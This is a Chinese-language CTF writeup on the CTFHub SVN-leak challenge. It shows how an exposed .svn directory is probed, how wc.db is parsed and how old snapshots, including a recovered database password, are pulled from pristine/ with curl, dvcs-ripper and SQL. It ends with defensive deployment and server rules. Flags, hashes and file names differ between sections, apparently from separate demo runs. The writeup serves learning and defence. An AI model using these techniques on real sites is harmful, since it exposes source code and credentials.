---
layout: post
title: CTFHub - SVN 泄露 Writeup
platform: ctfhub
date: 2026-10-16 11:33:00 +0800
categories: CTF
---

CTFHub - SVN 泄露 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → 信息泄露 → **SVN 泄露**）
- 题型：Web
- 考点：**`.svn` 目录泄露**、`pristine` 快照恢复、SQLite 解析
- 题目提示原文：

```text
当开发人员使用 SVN 进行版本控制，对站点自动部署。
如果配置不当，可能会将 .svn 文件夹直接部署到线上环境。
这就引起了 SVN 泄露。
```

首页还会显示：**"Flag 在服务端旧版本的源代码中"** ← 这句话是重要提示


```text
探测结果：
    /.svn/wc.db       → 200  (122880 字节)   ★ SVN 1.7+ 格式
    /.svn/entries     → 200  (3 字节，内容就是 "12")
    /.svn/format      → 200  (3 字节)
    /.svn/pristine/   → 403  （不允许列目录，但里面的文件能直接取）

解析 wc.db（SQLite）—— ★ 两个表都要看：

  NODES 表（工作副本的现状）：
      index.html              presence=normal         ← 当前存在
      flag_150944048.txt      presence=not-present     ← ★ 已被删除！

  PRISTINE 表（所有文件快照，包括已删除文件的）：
      $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92   size=221  refcount=1
      $sha1$9a314b72492ee25769f9714231621c0e16765e6d   size=33   refcount=0   ← ★ 孤儿快照

★ 那个 refcount=0 的孤儿快照（33 字节），对应的就是被删除的 flag 文件

下载：
    /.svn/pristine/9a/9a314b72492ee25769f9714231621c0e16765e6d.svn-base
    → 33 字节，内容是：
      ctfhub{4395647fe07db27472aa7a37}

flag         : ctfhub{4395647fe07db27472aa7a37}
```

> 💡 **本题最有价值的一点**：线索不只在 `NODES` 表（它只记录"现在有什么"），
> 更关键的是 **`PRISTINE` 表** —— 它记录**所有历史快照**，
> 包括那些**已经被删除**的文件的。`refcount=0` 就是"没人引用它了"的标志，
> 那往往正是被删掉的敏感文件。

二、题目分析

**① SVN 是什么**

```text
SVN（Subversion）= 集中式版本控制工具
    （Git 是分布式的，SVN 是集中式的，两者是同类工具、不同思路）

它在工作副本里放一个 .svn 隐藏目录，存着：
    · 版本库的元数据（哪些文件、什么版本、校验和）
    · ★ 所有文件的【原始快照】
```

**② 为什么会有"旧版本代码"**

```text
★ SVN 的 .svn/pristine/ 目录是关键：

    为了让 svn diff / svn revert 不用连服务器，
    SVN 会把工作副本里【所有文件的内容】存一份在 pristine 里，
    文件名 = 文件内容的 SHA-1 校验和。

    → 开发者在新版本里删掉的敏感内容（flag、密码），
      旧版本的快照仍然躺在 pristine 里，删不掉。
```

**③ `.svn` 的目录结构（SVN 1.7+）**

```text
.svn/
├── entries          新格式下内容很少（旧格式是纯文本的文件清单）
├── format           工作副本格式版本号（7 以上是新格式）
├── wc.db            ★ SQLite 数据库：记录所有文件的路径 + 校验和
├── wc.db-journal
├── pristine/        ★★ 所有文件的原始快照（按校验和命名）
│   ├── 0e/
│   │   └── 0e78c90adf80164481443e312422b7794ee95a9a.svn-base
│   └── af/
├── text-base/       旧格式（SVN 1.6）存文件内容的地方
└── tmp/
```

**④ 破题思路**

```text
① 探测 /.svn/ 是否可访问
② 下载 .svn/wc.db（SQLite），解析出【文件清单 + 每个文件的校验和】
③ 用校验和拼出 pristine 里的路径，下载那些 .svn-base 文件
④ 它们是 zlib 压缩的，解压 → 就是文件内容
⑤ 在其中找 flag（往往在某个"旧版本"文件里）
```

三、解题步骤

**方法一：用 dvcs-ripper（题目/教程推荐，需要 Perl）**

```bash
# 安装依赖（Kali / Linux）
sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl \
                     libclass-dbi-perl libio-all-lwp-perl

# 下载工具
git clone https://github.com/kost/dvcs-ripper.git
cd dvcs-ripper

# 利用（-v 详细输出）
perl rip-svn.pl -v -u http://challenge-xxx:10800/.svn/

# 工具会在当前目录生成一个以域名命名的文件夹
cd challenge-xxx_10800/

# ★ 在 pristine 里搜 flag
grep -r "ctfhub" .svn/pristine/
```

**预期输出**：

```text
.svn/pristine/a7/294d4e4625c9b4ab240223d871068cd0d9833fc1.svn-base:
ctfhub{6e5716008d759b6b60c9f738}
```

**方法二：手工挖（不需要工具，只需理解格式）**

**第 1 步：探测 `.svn`**

浏览器挨个访问（看哪个返回内容，而不是 404）：

```text
http://challenge-xxx:10800/.svn/wc.db        ← ★ 有这个就是 SVN 1.7+ 新格式
http://challenge-xxx:10800/.svn/entries
http://challenge-xxx:10800/.svn/format
http://challenge-xxx:10800/.svn/pristine/    ← ★ 快照目录
```

**第 2 步：下载 `wc.db` 并用 SQLite 打开**

```powershell
curl.exe -s "http://challenge-xxx:10800/.svn/wc.db" -o wc.db
```

它是个 **SQLite 数据库**，用任意 SQLite 工具打开（DB Browser for SQLite、Navicat、或者 Python）：

```sql
-- 关键在 NODES 表
SELECT local_relpath, checksum FROM NODES WHERE checksum IS NOT NULL;
```

**输出**：

```text
local_relpath       checksum
index.html          $sha1$dd255e9d51b1b58c28b77f40103db13d9758e69a
flag_old.php        $sha1$0e78c90adf80164481443e312422b7794ee95a9a     ← ★
config.php          $sha1$af3a0328f9bb71a695c45039a5c4f0eaa18c937c
```

**第 3 步：用校验和拼出 pristine 路径**

```text
校验和格式：$sha1$<40位十六进制>
                    ↓
pristine 路径 = .svn/pristine/<前2位>/<完整40位>.svn-base

举例：$sha1$0e78c90adf80164481443e312422b7794ee95a9a
      → http://challenge-xxx:10800/.svn/pristine/0e/0e78c90adf80164481443e312422b7794ee95a9a.svn-base
                                   └┬┘ └──────────────────┬──────────────────────┘
                                 前2位              完整的 40 位
```

**第 4 步：下载并解压**

```text
下载下来的是【zlib 压缩】的二进制 → 解压 → 就是文件内容
```

**第 5 步：搜 flag**

```text
在解压出来的内容里搜 ctfhub 或 flag{ }
```

**方法三：用我写的工具（纯 Python，双击即可）**

```text
双击 dump-svn-leak.bat
→ 粘贴题目根地址（结尾 :10800）
→ 回车
```

**实测输出**（我用 Python 构造了一个真实的 SVN 1.7+ 环境来验证）：

```text
① 探测 .svn 目录
   ★ /.svn/wc.db          -> 200   SVN 1.7+ 的数据库
   ★ /.svn/entries        -> 200
   ★ /.svn/format         -> 200
   ★ /.svn/pristine/      -> 200   ★ 文件快照目录
     /.svn/text-base/     -> 404   旧格式才有的目录

② 拿到文件清单
  下载 .svn/wc.db: 8192 字节
  它是 SQLite 数据库，用 sqlite3 解析...
    表: NODES
  ✔ 从 NODES 表解析出 3 个条目
     index.html       $sha1$dd255e9d51b1b58c28b77f40103db13d9758e69a
     flag_old.php     $sha1$0e78c90adf80164481443e312422b7794ee95a9a
     config.php       $sha1$af3a0328f9bb71a695c45039a5c4f0eaa18c937c

③ 挖 .svn/pristine/
  ── index.html
     pristine: /.svn/pristine/dd/dd255e...svn-base  (72 字节，解压后 83 字节)
     内容: <html><head><title>CTFHub SVN</title></head>...
  ── flag_old.php
     ★★★ 发现 flag: ctfhub{demo_svn_flag_test123}
  ── config.php
     内容: <?php $db_host='localhost'; $db_pass='old_password_123'; ?>
```

> 💡 注意最后那个 `config.php` —— **旧版本的数据库密码也被恢复出来了**。
> 这就是 SVN 泄露在真实渗透里的价值：**不只当前源码，连历史版本的敏感信息全都能拿到**。

四、延伸知识

**① 为什么 `pristine` 是"金矿"**

```text
· 它存的是【文件的原始内容快照】，即使工作区里的文件被改过/删过
· 命名是内容的 SHA-1 —— 内容一样就只存一份（去重）
· ★ 开发者在"新版本"里删掉的东西，在 pristine 里可能还留着旧版本

实战意义：
    某个密码在代码里硬编码过、后来移除了 →
    旧快照里还能找到那个密码
```

**② SVN 1.6（旧格式）和 1.7+（新格式）的区别**

| | SVN 1.6 及以前 | SVN 1.7+ |
|---|---|---|
| 元数据位置 | **每个子目录**里都有一个 `.svn/` | **只在根目录**有一个 `.svn/` |
| 文件清单 | `.svn/entries`（纯文本，可读） | `.svn/wc.db`（SQLite 二进制） |
| 文件内容 | `.svn/text-base/<文件名>.svn-base` | `.svn/pristine/<哈希>.svn-base` |
| 恢复难度 | 简单（路径可预测） | 要解析 SQLite |

**这题用的是 1.7+ 新格式**（所以必须解析 wc.db）。

**③ 常见的 SVN 泄露探测路径**

```text
/.svn/entries          ← 旧格式（1.6 以前）的入口
/.svn/wc.db            ← 新格式（1.7+）的入口
/.svn/format
/.svn/pristine/
/.svn/text-base/
/admin/.svn/           ← 子目录里也可能有（旧格式每层都有）
/backup/.svn/
```

**④ Git 泄露 vs SVN 泄露（对比记忆）**

| | Git 泄露 | SVN 泄露 |
|---|---|---|
| 泄露目录 | `.git/` | `.svn/` |
| 元数据 | 全是文本/自定义格式 | `wc.db`（SQLite） |
| 内容存放 | `.git/objects/<sha前2位>/<后38位>` | `.svn/pristine/<sha前2位>/<完整sha>.svn-base` |
| 是否压缩 | zlib 压缩 | ★ zlib 压缩 |
| 恢复工具 | GitHack、git 命令 | dvcs-ripper（rip-svn.pl） |
| 找历史版本 | 提交历史、悬空对象 | **pristine 快照** |

**⑤ 防护**

```text
· 部署时排除 .svn 目录：
      rsync -av --exclude='.svn' ...
      svn export（而不是 svn checkout）—— export 不带 .svn
· 服务器拒绝访问：
      Nginx:  location ~ /\.svn { deny all; }
      Apache: <DirectoryMatch "/\.svn"> Require all denied </DirectoryMatch>
· ★ 和 Git 一样：敏感信息一旦提交进版本库，删掉也没用 —— 必须作废重发
```

五、总结

- **本题核心：`.svn` 目录泄露 → 解析 `wc.db` 拿到校验和 → 从 `pristine/` 恢复文件快照 → 在旧版本代码里找 flag。**
- 关键三步：

```text
① /.svn/wc.db 是 SQLite → 查 NODES 表拿 local_relpath + checksum
② checksum 的 $sha1$xxxxx → 拼成 /.svn/pristine/<前2位>/<完整sha>.svn-base
③ 下载 → zlib 解压 → 文件内容
```

- 最重要的一条认知：

```text
★ SVN 的 pristine 目录保存着【所有文件的原始快照】
  → "新版本里删掉的敏感信息"在旧快照里依然存在
  → 题目提示说的"Flag 在服务端旧版本的源代码中"，说的就是这个
```


**配套文件**（都在工作区）：

```text
svn_leak_dump.py     纯 Python 的 SVN 泄露挖掘工具（解析 wc.db + 恢复 pristine）
dump-svn-leak.bat    双击启动器
mk_demo_svn.py       模拟 SVN 1.7+ 环境（可自己起服务练手）
```
